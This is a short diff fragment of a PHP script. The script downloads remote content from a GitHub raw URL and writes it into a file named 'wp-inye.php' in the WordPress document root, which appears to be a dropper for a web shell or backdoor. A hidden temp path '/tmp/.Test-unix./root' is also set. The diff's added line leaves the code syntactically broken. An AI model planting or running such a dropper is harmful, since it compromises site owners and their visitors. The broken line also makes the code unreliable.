@@ -6,7 +6,7 @@ $tmpshel = "/tmp/.Test-unix./root";
 
 
 $sec31= get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
-$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-inye.php";
+$wpoptionss31 = . "wp-inye.php";
 if (file_put_contents ($wpoptionss31, $sec31));
 
 /*
